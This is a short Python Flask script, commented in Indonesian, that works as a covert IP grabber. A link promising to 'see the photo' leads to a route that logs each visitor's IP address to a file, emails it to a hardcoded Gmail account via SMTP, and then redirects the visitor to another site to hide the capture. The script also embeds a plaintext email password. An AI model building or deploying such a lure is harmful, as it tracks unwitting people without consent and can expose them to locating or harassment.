import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, redirect

app = Flask(__name__)

# Fungsi untuk mengirim IP ke email
def send_ip_to_email(user_ip):
    sender_email = "siluix7@gmail.com"
    receiver_email = "siluix7@gmail.com"
    password = "Arsyauwaw"

    # Menyusun email
    subject = "IP Pengunjung"
    body = f"IP Pengunjung: {user_ip}"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    # Kirim email
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Enkripsi komunikasi
        server.login(sender_email, password)
        text = msg.as_string()
        server.sendmail(sender_email, receiver_email, text)
        server.quit()
        print(f"Email berhasil dikirim ke {receiver_email}")
    except Exception as e:
        print(f"Terjadi kesalahan saat mengirim email: {e}")

# Fungsi untuk menyimpan IP ke dalam file log
def save_ip_to_log(user_ip):
    with open("ip_log.txt", "a") as file:
        file.write(f"IP Pengunjung: {user_ip}\n")

@app.route('/')
def home():
    return '<a href="/track">Klik disini untuk melihat foto</a>'

@app.route('/track')
def track_ip():
    # Mendapatkan alamat IP pengunjung
    user_ip = request.remote_addr
    print(f"IP Pengunjung: {user_ip}")

    # Kirim IP ke email
    send_ip_to_email(user_ip)

    # Simpan IP ke dalam file log
    save_ip_to_log(user_ip)

    # Redirect pengunjung ke halaman lain setelah klik
    return redirect("https://example.com")

if __name__ == '__main__':
    app.run(debug=True)